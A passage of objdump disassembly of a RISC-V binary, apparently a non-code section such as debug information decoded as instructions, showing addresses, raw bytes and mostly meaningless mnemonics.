    1686:	0b00                	addi	s0,sp,400
    1688:	0079                	c.nop	30
    168a:	0000                	unimp
    168c:	681d0017          	auipc	zero,0x681d0
    1690:	0801                	addi	a6,a6,0
    1692:	029e                	slli	t0,t0,0x7
    1694:	0008c307          	flq	ft6,0(a7) # 4000 <_tbss_end+0x3f7c>
    1698:	1900                	addi	s0,sp,176
    169a:	0339                	addi	t1,t1,14
    169c:	0000                	unimp
    169e:	a108                	fsd	fa0,0(a0)
    16a0:	1b02                	slli	s6,s6,0x20
    16a2:	000008c3          	fmadd.s	fa7,ft0,ft0,ft0,rne
    16a6:	1900                	addi	s0,sp,176
    16a8:	031a                	slli	t1,t1,0x6
    16aa:	0000                	unimp
    16ac:	a208                	fsd	fa0,0(a2)
    16ae:	1802                	slli	a6,a6,0x20
    16b0:	000008d3          	fadd.s	fa7,ft0,ft0,rne
    16b4:	00f0                	addi	a2,sp,76
    16b6:	590a                	lw	s2,160(sp)
    16b8:	d3000003          	lb	zero,-720(zero) # 681d13bc <_tbss_end+0x681d1338>
    16bc:	0008                	0x8
    16be:	0b00                	addi	s0,sp,400
    16c0:	0079                	c.nop	30
    16c2:	0000                	unimp
    16c4:	001d                	c.nop	7
    16c6:	5f0a                	lw	t5,160(sp)
    16c8:	0000                	unimp
    16ca:	e300                	sd	s0,0(a4)
    16cc:	0008                	0x8
    16ce:	0b00                	addi	s0,sp,400
    16d0:	0079                	c.nop	30
    16d2:	0000                	unimp
    16d4:	001d                	c.nop	7
    16d6:	681e                	ld	a6,448(sp)
    16d8:	0801                	addi	a6,a6,0
    16da:	09030283          	lb	t0,144(t1) # fffffffffffe0090 <_end+0xffffffff7ffc4bd0>
    16de:	0009                	c.nop	2
    16e0:	1f00                	addi	s0,sp,944
    16e2:	0481                	addi	s1,s1,0
    16e4:	0000                	unimp
    16e6:	9a08                	0x9a08
    16e8:	0b02                	slli	s6,s6,0x0
    16ea:	0000074f          	fnmadd.s	fa4,ft0,ft0,ft0,rne
    16ee:	a31f 0005 0800      	0x8000005a31f
    16f4:	9b0b02a3          	sb	a6,-1627(s6) # 4909a5 <_tbss_end+0x490921>
    16f8:	0008                	0x8
    16fa:	0000                	unimp
    16fc:	1a0a                	slli	s4,s4,0x22
    16fe:	0006                	c.slli	zero,0x1
    1700:	1900                	addi	s0,sp,176
    1702:	0009                	c.nop	2
    1704:	0b00                	addi	s0,sp,400
    1706:	0079                	c.nop	30
    1708:	0000                	unimp
    170a:	0018                	0x18
    170c:	a220                	fsd	fs0,64(a2)
    170e:	0000                	unimp
    1710:	1200                	addi	s0,sp,288
    1712:	1908                	addi	a0,sp,176
    1714:	0009                	c.nop	2
    1716:	2100                	fld	fs0,0(a0)
    1718:	0000092f          	0x92f
    171c:	0004c017          	auipc	zero,0x4c
    1720:	0000                	unimp
    1722:	0812                	slli	a6,a6,0x4
    1724:	0924                	addi	s1,sp,152
    1726:	0000                	unimp
    1728:	0812                	slli	a6,a6,0x4
    172a:	01e1                	addi	gp,gp,24
    172c:	0000                	unimp
    172e:	4621                	li	a2,8
    1730:	0009                	c.nop	2
    1732:	1700                	addi	s0,sp,928
    1734:	0049                	c.nop	18
    1736:	0000                	unimp
    1738:	1200                	addi	s0,sp,288
    173a:	4c08                	lw	a0,24(s0)
    173c:	0009                	c.nop	2
    173e:	1200                	addi	s0,sp,288
    1740:	3b08                	fld	fa0,48(a4)
    1742:	0009                	c.nop	2
    1744:	0a00                	addi	s0,sp,272
    1746:	06b4                	addi	a3,sp,840
    1748:	0000                	unimp
    174a:	0962                	slli	s2,s2,0x18
    174c:	0000                	unimp
    174e:	0000790b          	0x790b
    1752:	0200                	addi	s0,sp,256
    1754:	2200                	fld	fs0,0(a2)
    1756:	0541                	addi	a0,a0,16
    1758:	0000                	unimp
    175a:	3308                	fld	fa0,32(a4)
    175c:	04c01703          	lh	a4,76(zero) # 4d768 <_tbss_end+0x4d6e4>
    1760:	0000                	unimp
    1762:	3a22                	fld	fs4,40(sp)
    1764:	0005                	c.nop	1
    1766:	0800                	addi	s0,sp,16
    1768:	0334                	addi	a3,sp,392
    176a:	c61d                	beqz	a2,1798 <_tbss_end+0x1714>
    176c:	0004                	0x4
    176e:	0600                	addi	s0,sp,768
    1770:	0709                	addi	a4,a4,2
    1772:	0000                	unimp
    1774:	280a                	fld	fa6,128(sp)
    1776:	00015d1b          	srliw	s10,sp,0x0
    177a:	0600                	addi	s0,sp,768
    177c:	0710                	addi	a2,sp,896
    177e:	0000                	unimp
    1780:	630a                	ld	t1,128(sp)
    1782:	7c18                	ld	a4,56(s0)
    1784:	0009                	c.nop	2
    1786:	2300                	fld	fs0,0(a4)
    1788:	08e4                	addi	s1,sp,92
    178a:	0000                	unimp
    178c:	0f02                	slli	t5,t5,0x0
    178e:	981a                	add	a6,a6,t1
    1790:	0000                	unimp
    1792:	2300                	fld	fs0,0(a4)
    1794:	0938                	addi	a4,sp,152
    1796:	0000                	unimp
    1798:	1002                	c.slli	zero,0x20
    179a:	981a                	add	a6,a6,t1
    179c:	0000                	unimp
    179e:	0a00                	addi	s0,sp,272
    17a0:	009d                	addi	ra,ra,7
    17a2:	0000                	unimp
    17a4:	09bc                	addi	a5,sp,216
    17a6:	0000                	unimp
    17a8:	0000790b          	0x790b
    17ac:	0100                	addi	s0,sp,128
    17ae:	2400                	fld	fs0,8(s0)
    17b0:	00000737          	lui	a4,0x0
    17b4:	2502                	fld	fa0,0(sp)
    17b6:	ac12                	fsd	ft4,24(sp)
    17b8:	0009                	c.nop	2
    17ba:	0900                	addi	s0,sp,144
    17bc:	01b48003          	lb	zero,27(s1)
    17c0:	0080                	addi	s0,sp,64
    17c2:	0000                	unimp
    17c4:	0a00                	addi	s0,sp,272
    17c6:	0614                	addi	a3,sp,768
    17c8:	0000                	unimp
    17ca:	09e2                	slli	s3,s3,0x18
    17cc:	0000                	unimp
    17ce:	0000790b          	0x790b
    17d2:	0100                	addi	s0,sp,128
    17d4:	2400                	fld	fs0,8(s0)
    17d6:	0856                	slli	a6,a6,0x15
    17d8:	0000                	unimp
    17da:	2602                	fld	fa2,0(sp)
    17dc:	d20e                	sw	gp,36(sp)
    17de:	0009                	c.nop	2
    17e0:	0900                	addi	s0,sp,144
    17e2:	01b49003          	lh	zero,27(s1)
    17e6:	0080                	addi	s0,sp,64
    17e8:	0000                	unimp
    17ea:	2500                	fld	fs0,8(a0)
    17ec:	095a                	slli	s2,s2,0x16
    17ee:	0000                	unimp
    17f0:	c302                	sw	zero,132(sp)
    17f2:	0601                	addi	a2,a2,0
    17f4:	0066                	c.slli	zero,0x19
    17f6:	0000                	unimp
    17f8:	2734                	fld	fa3,72(a4)
    17fa:	8000                	0x8000
    17fc:	0000                	unimp
    17fe:	0000                	unimp
    1800:	00dc                	addi	a5,sp,68
    1802:	0000                	unimp
    1804:	0000                	unimp
    1806:	0000                	unimp
    1808:	9c01                	subw	s0,s0,s0
    180a:	0a4c                	addi	a1,sp,276
    180c:	0000                	unimp
    180e:	7326                	ld	t1,104(sp)
    1810:	7274                	ld	a3,224(a2)
    1812:	0200                	addi	s0,sp,256
    1814:	4a1701c3          	fmadd.d	ft3,fa4,ft1,fs1,rne
    1818:	0006                	c.slli	zero,0x1
    181a:	0200                	addi	s0,sp,256
    181c:	5891                	li	a7,-28
    181e:	73657227          	0x73657227
    1822:	0200                	addi	s0,sp,256
    1824:	01c5                	addi	gp,gp,17
    1826:	6608                	ld	a0,8(a2)
    1828:	0000                	unimp
    182a:	0200                	addi	s0,sp,256
    182c:	6891                	lui	a7,0x4
    182e:	ad28                	fsd	fa0,88(a0)
    1830:	0001                	nop
    1832:	0200                	addi	s0,sp,256
    1834:	01c6                	slli	gp,gp,0x11
    1836:	00004907          	flq	fs2,0(zero) # 0 <_tdata_begin>
    183a:	0200                	addi	s0,sp,256
    183c:	6491                	lui	s1,0x4
    183e:	2900                	fld	fs0,16(a0)
    1840:	06ec                	addi	a1,sp,844
    1842:	0000                	unimp
    1844:	1408260b          	0x1408260b
    1848:	0006                	c.slli	zero,0x1
    184a:	ea00                	sd	s0,16(a2)
    184c:	0026                	c.slli	zero,0x9
    184e:	0080                	addi	s0,sp,64
    1850:	0000                	unimp
    1852:	4a00                	lw	s0,16(a2)
    1854:	0000                	unimp
    1856:	0000                	unimp
    1858:	0000                	unimp
    185a:	0100                	addi	s0,sp,128
    185c:	9d9c                	0x9d9c
    185e:	000a                	c.slli	zero,0x2
    1860:	2a00                	fld	fs0,16(a2)
    1862:	0978                	addi	a4,sp,156
    1864:	0000                	unimp
    1866:	bb02                	fsd	ft0,432(sp)
    1868:	1401                	addi	s0,s0,-32
    186a:	0614                	addi	a3,sp,768
    186c:	0000                	unimp
    186e:	9102                	jalr	sp
    1870:	2658                	fld	fa4,136(a2)
    1872:	00637273          	csrrci	tp,0x6,6
    1876:	bb02                	fsd	ft0,432(sp)
    1878:	2601                	sext.w	a2,a2
    187a:	064a                	slli	a2,a2,0x12
    187c:	0000                	unimp
    187e:	9102                	jalr	sp
    1880:	2750                	fld	fa2,136(a4)
    1882:	0064                	addi	s1,sp,12
    1884:	bd02                	fsd	ft0,184(sp)
    1886:	0901                	addi	s2,s2,0
    1888:	0614                	addi	a3,sp,768
    188a:	0000                	unimp
    188c:	9102                	jalr	sp
    188e:	0068                	addi	a0,sp,12
    1890:	8b29                	andi	a4,a4,10
    1892:	0b000007          	0xb000007
    1896:	0624                	addi	s1,sp,776
    1898:	0049                	c.nop	18
    189a:	0000                	unimp
    189c:	267a                	fld	fa2,408(sp)
    189e:	8000                	0x8000
    18a0:	0000                	unimp
    18a2:	0000                	unimp
    18a4:	0070                	addi	a2,sp,12
    18a6:	0000                	unimp
    18a8:	0000                	unimp
    18aa:	0000                	unimp
    18ac:	9c01                	subw	s0,s0,s0
    18ae:	0afc                	addi	a5,sp,348
    18b0:	0000                	unimp
    18b2:	7326                	ld	t1,104(sp)
    18b4:	0031                	c.nop	12
    18b6:	af02                	fsd	ft0,408(sp)
    18b8:	1801                	addi	a6,a6,-32
    18ba:	064a                	slli	a2,a2,0x12
    18bc:	0000                	unimp
    18be:	9102                	jalr	sp
    18c0:	2658                	fld	fa4,136(a2)
    18c2:	02003273          	csrrc	tp,0x20,zero
    18c6:	4a2801af          	0x4a2801af
    18ca:	0006                	c.slli	zero,0x1
    18cc:	0200                	addi	s0,sp,256
    18ce:	5091                	li	ra,-28
    18d0:	00316327          	0x316327
    18d4:	b102                	fsd	ft0,160(sp)
    18d6:	1101                	addi	sp,sp,-32
    18d8:	0034                	addi	a3,sp,8
    18da:	0000                	unimp
    18dc:	9102                	jalr	sp
    18de:	3263276f          	jal	a4,33c04 <_tbss_end+0x33b80>
    18e2:	0200                	addi	s0,sp,256
    18e4:	01b1                	addi	gp,gp,12
    18e6:	3415                	addiw	s0,s0,-27
    18e8:	0000                	unimp
    18ea:	0200                	addi	s0,sp,256
    18ec:	6e91                	lui	t4,0x4
    18ee:	2900                	fld	fs0,16(a0)
    18f0:	067d                	addi	a2,a2,31
    18f2:	0000                	unimp
    18f4:	ae09770b          	0xae09770b
    18f8:	0000                	unimp
    18fa:	2c00                	fld	fs0,24(s0)
    18fc:	0026                	c.slli	zero,0x9
    18fe:	0080                	addi	s0,sp,64
    1900:	0000                	unimp
    1902:	4e00                	lw	s0,24(a2)
    1904:	0000                	unimp
    1906:	0000                	unimp
    1908:	0000                	unimp
    190a:	0100                	addi	s0,sp,128
    190c:	499c                	lw	a5,16(a1)
    190e:	2600000b          	0x2600000b
    1912:	a7020073          	0xa7020073
    1916:	1c01                	addi	s8,s8,-32
    1918:	064a                	slli	a2,a2,0x12
    191a:	0000                	unimp
    191c:	9102                	jalr	sp
    191e:	2658                	fld	fa4,136(a2)
    1920:	006e                	c.slli	zero,0x1b
    1922:	a702                	fsd	ft0,392(sp)
    1924:	2601                	sext.w	a2,a2
    1926:	00ae                	slli	ra,ra,0xb
    1928:	0000                	unimp
    192a:	9102                	jalr	sp
    192c:	2750                	fld	fa2,136(a4)
    192e:	0070                	addi	a2,sp,12
    1930:	a902                	fsd	ft0,144(sp)
    1932:	0f01                	addi	t5,t5,0
    1934:	064a                	slli	a2,a2,0x12
    1936:	0000                	unimp
    1938:	9102                	jalr	sp
    193a:	0068                	addi	a0,sp,12
    193c:	6529                	lui	a0,0xa
    193e:	0006                	c.slli	zero,0x1
    1940:	0b00                	addi	s0,sp,400
    1942:	0929                	addi	s2,s2,10
    1944:	00ae                	slli	ra,ra,0xb
    1946:	0000                	unimp
    1948:	25f0                	fld	fa2,200(a1)
    194a:	8000                	0x8000
    194c:	0000                	unimp
    194e:	0000                	unimp
    1950:	003c                	addi	a5,sp,8
    1952:	0000                	unimp
    1954:	0000                	unimp
    1956:	0000                	unimp
    1958:	9c01                	subw	s0,s0,s0
    195a:	0b88                	addi	a0,sp,464
    195c:	0000                	unimp
    195e:	7326                	ld	t1,104(sp)
    1960:	0200                	addi	s0,sp,256
    1962:	019f 4a1b 0006      	0x64a1b019f
    1968:	0200                	addi	s0,sp,256
    196a:	5891                	li	a7,-28
    196c:	02007027          	0x2007027
    1970:	01a1                	addi	gp,gp,8
    1972:	00064a0f          	0x64a0f
    1976:	0200                	addi	s0,sp,256
    1978:	6891                	lui	a7,0x4
    197a:	2900                	fld	fs0,16(a0)
    197c:	07ae                	slli	a5,a5,0xb
    197e:	0000                	unimp
    1980:	5b09210b          	0x5b09210b
    1984:	0001                	nop
    1986:	2200                	fld	fs0,0(a2)
    1988:	0025                	c.nop	9
    198a:	0080                	addi	s0,sp,64
    198c:	0000                	unimp
    198e:	ce00                	sw	s0,24(a2)
    1990:	0000                	unimp
    1992:	0000                	unimp
    1994:	0000                	unimp
    1996:	0100                	addi	s0,sp,128
    1998:	309c                	fld	fa5,32(s1)
    199a:	000c                	0xc
    199c:	2a00                	fld	fs0,16(a2)
    199e:	0978                	addi	a4,sp,156
    19a0:	0000                	unimp
    19a2:	8c02                	jr	s8
    19a4:	1401                	addi	s0,s0,-32
    19a6:	0000015b          	0x15b
    19aa:	9102                	jalr	sp
    19ac:	2a48                	fld	fa0,144(a2)
    19ae:	08fe                	slli	a7,a7,0x1f
    19b0:	0000                	unimp
    19b2:	8c02                	jr	s8
    19b4:	1e01                	addi	t3,t3,-32
    19b6:	0049                	c.nop	18
    19b8:	0000                	unimp
    19ba:	9102                	jalr	sp
    19bc:	2644                	fld	fs1,136(a2)
    19be:	656c                	ld	a1,200(a0)
    19c0:	006e                	c.slli	zero,0x1b
    19c2:	8c02                	jr	s8
    19c4:	2b01                	sext.w	s6,s6
    19c6:	00ae                	slli	ra,ra,0xb
    19c8:	0000                	unimp
    19ca:	7fb89103          	lh	sp,2043(a7) # 47fb <_tbss_end+0x4777>
    19ce:	0025442b          	0x25442b
    19d2:	0080                	addi	s0,sp,64
    19d4:	0000                	unimp
    19d6:	6c00                	ld	s0,24(s0)
    19d8:	0000                	unimp
    19da:	0000                	unimp
    19dc:	0000                	unimp
    19de:	0f00                	addi	s0,sp,912
    19e0:	000c                	0xc
    19e2:	2800                	fld	fs0,16(s0)
    19e4:	0864                	addi	s1,sp,28
    19e6:	0000                	unimp
    19e8:	8f02                	jr	t5
    19ea:	0f01                	addi	t5,t5,0
    19ec:	009d                	addi	ra,ra,7
    19ee:	0000                	unimp
    19f0:	9102                	jalr	sp
    19f2:	2758                	fld	fa4,136(a4)
    19f4:	0064                	addi	s1,sp,12
    19f6:	9402                	jalr	s0
    19f8:	1001                	c.nop	-32
    19fa:	0c30                	addi	a2,sp,536
    19fc:	0000                	unimp
    19fe:	9102                	jalr	sp
    1a00:	0068                	addi	a0,sp,12
    1a02:	b02c                	fsd	fa1,96(s0)
    1a04:	0025                	c.nop	9
    1a06:	0080                	addi	s0,sp,64
    1a08:	0000                	unimp
    1a0a:	3400                	fld	fs0,40(s0)
    1a0c:	0000                	unimp
    1a0e:	0000                	unimp
    1a10:	0000                	unimp
    1a12:	2700                	fld	fs0,8(a4)
    1a14:	0064                	addi	s1,sp,12
    1a16:	9802                	jalr	a6
    1a18:	0b01                	addi	s6,s6,0
    1a1a:	0614                	addi	a3,sp,768
    1a1c:	0000                	unimp
    1a1e:	9102                	jalr	sp
    1a20:	0060                	addi	s0,sp,12
    1a22:	1200                	addi	s0,sp,288
    1a24:	9d08                	0x9d08
    1a26:	0000                	unimp
    1a28:	2900                	fld	fs0,16(a0)
    1a2a:	0941                	addi	s2,s2,16
    1a2c:	0000                	unimp
    1a2e:	5b091f0b          	0x5b091f0b
    1a32:	0001                	nop
    1a34:	6a00                	ld	s0,16(a2)
    1a36:	0024                	addi	s1,sp,8
    1a38:	0080                	addi	s0,sp,64
    1a3a:	0000                	unimp
    1a3c:	b800                	fsd	fs0,48(s0)
    1a3e:	0000                	unimp
    1a40:	0000                	unimp
    1a42:	0000                	unimp
    1a44:	0100                	addi	s0,sp,128
    1a46:	ea9c                	sd	a5,16(a3)
    1a48:	000c                	0xc
    1a4a:	2a00                	fld	fs0,16(a2)
    1a4c:	0978                	addi	a4,sp,156
    1a4e:	0000                	unimp
    1a50:	7c02                	ld	s8,32(sp)
    1a52:	1401                	addi	s0,s0,-32
    1a54:	0000015b          	0x15b
    1a58:	9102                	jalr	sp
    1a5a:	2648                	fld	fa0,136(a2)
    1a5c:	00637273          	csrrci	tp,0x6,6
    1a60:	7c02                	ld	s8,32(sp)
    1a62:	2601                	sext.w	a2,a2
    1a64:	0cea                	slli	s9,s9,0x1a
    1a66:	0000                	unimp
    1a68:	9102                	jalr	sp
    1a6a:	2640                	fld	fs0,136(a2)
    1a6c:	656c                	ld	a1,200(a0)
    1a6e:	006e                	c.slli	zero,0x1b
    1a70:	7c02                	ld	s8,32(sp)
    1a72:	3201                	addiw	tp,tp,-32
    1a74:	00ae                	slli	ra,ra,0xb
    1a76:	0000                	unimp
    1a78:	7fb89103          	lh	sp,2043(a7)
    1a7c:	0024902b          	0x24902b
    1a80:	0080                	addi	s0,sp,64
    1a82:	0000                	unimp
    1a84:	4200                	lw	s0,0(a2)
    1a86:	0000                	unimp
    1a88:	0000                	unimp
    1a8a:	0000                	unimp
    1a8c:	bb00                	fsd	fs0,48(a4)
    1a8e:	000c                	0xc
    1a90:	2700                	fld	fs0,8(a4)
    1a92:	7f020073          	0x7f020073
    1a96:	1601                	addi	a2,a2,-32
    1a98:	0cf1                	addi	s9,s9,28
    1a9a:	0000                	unimp
    1a9c:	9102                	jalr	sp
    1a9e:	2768                	fld	fa0,200(a4)
    1aa0:	0064                	addi	s1,sp,12
    1aa2:	8002                	0x8002
    1aa4:	1001                	c.nop	-32
    1aa6:	0c30                	addi	a2,sp,536
    1aa8:	0000                	unimp
    1aaa:	9102                	jalr	sp
    1aac:	0060                	addi	s0,sp,12
    1aae:	d22c                	sw	a1,96(a2)
    1ab0:	0024                	addi	s1,sp,8
    1ab2:	0080                	addi	s0,sp,64
    1ab4:	0000                	unimp
    1ab6:	4400                	lw	s0,8(s0)
    1ab8:	0000                	unimp
    1aba:	0000                	unimp
    1abc:	0000                	unimp
    1abe:	2700                	fld	fs0,8(a4)
    1ac0:	84020073          	0x84020073
    1ac4:	1101                	addi	sp,sp,-32
    1ac6:	064a                	slli	a2,a2,0x12
    1ac8:	0000                	unimp
    1aca:	9102                	jalr	sp
    1acc:	2758                	fld	fa4,136(a4)
    1ace:	0064                	addi	s1,sp,12
    1ad0:	8502                	jr	a0
    1ad2:	0b01                	addi	s6,s6,0
    1ad4:	0614                	addi	a3,sp,768
    1ad6:	0000                	unimp
    1ad8:	9102                	jalr	sp
    1ada:	0050                	addi	a2,sp,4
    1adc:	1200                	addi	s0,sp,288
    1ade:	f008                	sd	a0,32(s0)
    1ae0:	000c                	0xc
    1ae2:	2d00                	fld	fs0,24(a0)
    1ae4:	0812                	slli	a6,a6,0x4
    1ae6:	00a9                	addi	ra,ra,10
    1ae8:	0000                	unimp
    1aea:	0d2e                	slli	s10,s10,0xb
    1aec:	0008                	0x8
    1aee:	0300                	addi	s0,sp,384
    1af0:	05f4                	addi	a3,sp,716
    1af2:	0049                	c.nop	18
    1af4:	0000                	unimp
    1af6:	23a8                	fld	fa0,64(a5)
    1af8:	8000                	0x8000
    1afa:	0000                	unimp
    1afc:	0000                	unimp
    1afe:	00c2                	slli	ra,ra,0x10
    1b00:	0000                	unimp
    1b02:	0000                	unimp
    1b04:	0000                	unimp
    1b06:	9c01                	subw	s0,s0,s0
    1b08:	0db1                	addi	s11,s11,12
    1b0a:	0000                	unimp
    1b0c:	7326                	ld	t1,104(sp)
    1b0e:	7274                	ld	a3,224(a2)
    1b10:	0200                	addi	s0,sp,256
    1b12:	0168                	addi	a0,sp,140
    1b14:	00061413          	slli	s0,a2,0x0
    1b18:	0300                	addi	s0,sp,384
    1b1a:	8891                	andi	s1,s1,4
    1b1c:	267e                	fld	fa2,472(sp)
    1b1e:	6d66                	ld	s10,88(sp)
    1b20:	0074                	addi	a3,sp,12
    1b22:	6802                	ld	a6,0(sp)
    1b24:	2401                	sext.w	s0,s0
    1b26:	064a                	slli	a2,a2,0x12
    1b28:	0000                	unimp
    1b2a:	7e809103          	lh	sp,2024(ra)
    1b2e:	7061272f          	0x7061272f
    1b32:	0200                	addi	s0,sp,256
    1b34:	016a                	slli	sp,sp,0x1a
    1b36:	0009880b          	0x9880b
    1b3a:	0300                	addi	s0,sp,384
    1b3c:	b091                	j	1380 <_tbss_end+0x12fc>
    1b3e:	287f                	0x287f
    1b40:	0732                	slli	a4,a4,0xc
    1b42:	0000                	unimp
    1b44:	6b02                	ld	s6,0(sp)
    1b46:	0901                	addi	s2,s2,0
    1b48:	0614                	addi	a3,sp,768
    1b4a:	0000                	unimp
    1b4c:	7fb89103          	lh	sp,2043(a7)
    1b50:	f030                	sd	a2,96(s0)
    1b52:	0008                	0x8
    1b54:	0200                	addi	s0,sp,256
    1b56:	016e                	slli	sp,sp,0x1b
    1b58:	6208                	ld	a0,0(a2)
    1b5a:	00800023          	sb	s0,0(zero) # 0 <_tdata_begin>
    1b5e:	0000                	unimp
    1b60:	4600                	lw	s0,8(a2)
    1b62:	0000                	unimp
    1b64:	0000                	unimp
    1b66:	0000                	unimp
    1b68:	0100                	addi	s0,sp,128
    1b6a:	079c                	addi	a5,sp,960
    1b6c:	4891                	li	a7,4
    1b6e:	2306                	fld	ft6,64(sp)
    1b70:	0190                	addi	a2,sp,192
    1b72:	2606                	fld	fa2,64(sp)
    1b74:	02006863          	bltu	zero,zero,1ba4 <_tbss_end+0x1b20>
    1b78:	016e                	slli	sp,sp,0x1b
    1b7a:	491a                	lw	s2,132(sp)
    1b7c:	0000                	unimp
    1b7e:	0200                	addi	s0,sp,256
    1b80:	5c91                	li	s9,-28
    1b82:	602a                	0x602a
    1b84:	0006                	c.slli	zero,0x1
    1b86:	0200                	addi	s0,sp,256
    1b88:	016e                	slli	sp,sp,0x1b
    1b8a:	b125                	j	17b2 <_tbss_end+0x172e>
    1b8c:	000d                	c.nop	3
    1b8e:	0200                	addi	s0,sp,256
    1b90:	5091                	li	ra,-28
    1b92:	a928                	fsd	fa0,80(a0)
    1b94:	02000007          	0x2000007
    1b98:	0170                	addi	a2,sp,140
    1b9a:	b70c                	fsd	fa1,40(a4)
    1b9c:	000d                	c.nop	3
    1b9e:	0200                	addi	s0,sp,256
    1ba0:	6891                	lui	a7,0x4
    1ba2:	0000                	unimp
    1ba4:	0812                	slli	a6,a6,0x4
    1ba6:	0000015b          	0x15b
    1baa:	0812                	slli	a6,a6,0x4
    1bac:	0614                	addi	a3,sp,768
    1bae:	0000                	unimp
    1bb0:	dd2e                	sw	a1,184(sp)
    1bb2:	0008                	0x8
    1bb4:	0300                	addi	s0,sp,384
    1bb6:	05c8                	addi	a0,sp,708
    1bb8:	0049                	c.nop	18
    1bba:	0000                	unimp
    1bbc:	230c                	fld	fa1,0(a4)
    1bbe:	8000                	0x8000
    1bc0:	0000                	unimp
    1bc2:	0000                	unimp
    1bc4:	0056                	c.slli	zero,0x15
    1bc6:	0000                	unimp
    1bc8:	0000                	unimp
    1bca:	0000                	unimp
    1bcc:	9c01                	subw	s0,s0,s0
    1bce:	0e02                	slli	t3,t3,0x0
    1bd0:	0000                	unimp
    1bd2:	6626                	ld	a2,72(sp)
    1bd4:	746d                	lui	s0,0xffffb
    1bd6:	0200                	addi	s0,sp,256
    1bd8:	015d                	addi	sp,sp,23
    1bda:	4a18                	lw	a4,16(a2)
    1bdc:	0006                	c.slli	zero,0x1
    1bde:	0300                	addi	s0,sp,384
    1be0:	9891                	andi	s1,s1,-28
    1be2:	2f7f                	0x2f7f
    1be4:	00706127          	0x706127
    1be8:	5f02                	lw	t5,32(sp)
    1bea:	0b01                	addi	s6,s6,0
    1bec:	0988                	addi	a0,sp,208
    1bee:	0000                	unimp
    1bf0:	7fa89103          	lh	sp,2042(a7) # 47fa <_tbss_end+0x4776>
    1bf4:	3100                	fld	fs0,32(a0)
    1bf6:	097d                	addi	s2,s2,31
    1bf8:	0000                	unimp
    1bfa:	c602                	sw	zero,12(sp)
    1bfc:	ae0d                	j	1f2e <_tbss_end+0x1eaa>
    1bfe:	001f 0080 0000      	0x80001f
    1c04:	5e00                	lw	s0,56(a2)
    1c06:	00000003          	lb	zero,0(zero) # 0 <_tdata_begin>
    1c0a:	0000                	unimp
    1c0c:	0100                	addi	s0,sp,128
    1c0e:	429c                	lw	a5,0(a3)
    1c10:	3200000f          	0x3200000f
    1c14:	08f8                	addi	a4,sp,92
    1c16:	0000                	unimp
    1c18:	c602                	sw	zero,12(sp)
    1c1a:	521e                	lw	tp,228(sp)
    1c1c:	0300000f          	fence	rw,unknown
    1c20:	a891                	j	1c74 <_tbss_end+0x1bf0>
    1c22:	327f                	0x327f
    1c24:	07f6                	slli	a5,a5,0x1d
    1c26:	0000                	unimp
    1c28:	c602                	sw	zero,12(sp)
    1c2a:	b13a                	fsd	fa4,160(sp)
    1c2c:	000d                	c.nop	3
    1c2e:	0300                	addi	s0,sp,384
    1c30:	a091                	j	1c74 <_tbss_end+0x1bf0>
    1c32:	337f                	0x337f
    1c34:	6d66                	ld	s10,88(sp)
    1c36:	0074                	addi	a3,sp,12
    1c38:	c602                	sw	zero,12(sp)
    1c3a:	4a4e                	lw	s4,208(sp)
    1c3c:	0006                	c.slli	zero,0x1
    1c3e:	0300                	addi	s0,sp,384
    1c40:	9891                	andi	s1,s1,-28
    1c42:	337f                	0x337f
    1c44:	7061                	c.lui	zero,0xffff8
    1c46:	0200                	addi	s0,sp,256
    1c48:	5bc6                	lw	s7,112(sp)
    1c4a:	0988                	addi	a0,sp,208
    1c4c:	0000                	unimp
    1c4e:	7f909103          	lh	sp,2041(ra)
    1c52:	7034                	ld	a3,96(s0)
    1c54:	0200                	addi	s0,sp,256
    1c56:	18c8                	addi	a0,sp,116
    1c58:	064a                	slli	a2,a2,0x12
    1c5a:	0000                	unimp
    1c5c:	6201                	0x6201
    1c5e:	7224                	ld	s1,96(a2)
    1c60:	02000007          	0x2000007
    1c64:	0fc9                	addi	t6,t6,18
    1c66:	064a                	slli	a2,a2,0x12
    1c68:	0000                	unimp
    1c6a:	7fb89103          	lh	sp,2043(a7)
    1c6e:	6334                	ld	a3,64(a4)
    1c70:	0068                	addi	a0,sp,12
    1c72:	ca02                	sw	zero,20(sp)
    1c74:	4910                	lw	a2,16(a0)
    1c76:	0000                	unimp
    1c78:	0100                	addi	s0,sp,128
    1c7a:	3559                	addiw	a0,a0,-10
    1c7c:	7265                	lui	tp,0xffff9
    1c7e:	0072                	c.slli	zero,0x1c
    1c80:	ca02                	sw	zero,20(sp)
    1c82:	4914                	lw	a3,16(a0)
    1c84:	0000                	unimp
    1c86:	3400                	fld	fs0,40(s0)
    1c88:	756e                	ld	a0,248(sp)
    1c8a:	006d                	c.nop	27
    1c8c:	cb02                	sw	zero,148(sp)
    1c8e:	7416                	ld	s0,352(sp)
    1c90:	0008                	0x8
    1c92:	0200                	addi	s0,sp,256
    1c94:	5891                	li	a7,-28
    1c96:	0324                	addi	s1,sp,392
    1c98:	0001                	nop
    1c9a:	0200                	addi	s0,sp,256
    1c9c:	07cc                	addi	a1,sp,964
    1c9e:	0049                	c.nop	18
    1ca0:	0000                	unimp
    1ca2:	9102                	jalr	sp
    1ca4:	2454                	fld	fa3,136(s0)
    1ca6:	000007a3          	sb	zero,15(zero) # ffffffffffff800f <_end+0xffffffff7ffdcb4f>
    1caa:	cc02                	sw	zero,24(sp)
    1cac:	490d                	li	s2,3
    1cae:	0000                	unimp
    1cb0:	0200                	addi	s0,sp,256
    1cb2:	5091                	li	ra,-28
    1cb4:	2c24                	fld	fs1,88(s0)
    1cb6:	02000007          	0x2000007
    1cba:	14cc                	addi	a1,sp,612
    1cbc:	0049                	c.nop	18
    1cbe:	0000                	unimp
    1cc0:	9102                	jalr	sp
    1cc2:	244c                	fld	fa1,136(s0)
    1cc4:	068d                	addi	a3,a3,3
    1cc6:	0000                	unimp
    1cc8:	cc02                	sw	zero,24(sp)
    1cca:	0000491b          	0x491b
    1cce:	0200                	addi	s0,sp,256
    1cd0:	4891                	li	a7,4
    1cd2:	3524                	fld	fs1,104(a0)
    1cd4:	0008                	0x8
    1cd6:	0200                	addi	s0,sp,256
    1cd8:	26cc                	fld	fa1,136(a3)
    1cda:	0049                	c.nop	18
    1cdc:	0000                	unimp
    1cde:	7fb49103          	lh	sp,2043(s1) # 47fb <_tbss_end+0x4777>
    1ce2:	1824                	addi	s1,sp,56
    1ce4:	02000007          	0x2000007
    1ce8:	08cd                	addi	a7,a7,19
    1cea:	061a                	slli	a2,a2,0x6
    1cec:	0000                	unimp
    1cee:	9102                	jalr	sp
    1cf0:	07823647          	fmsub.q	fa2,ft4,fs8,ft0,rup
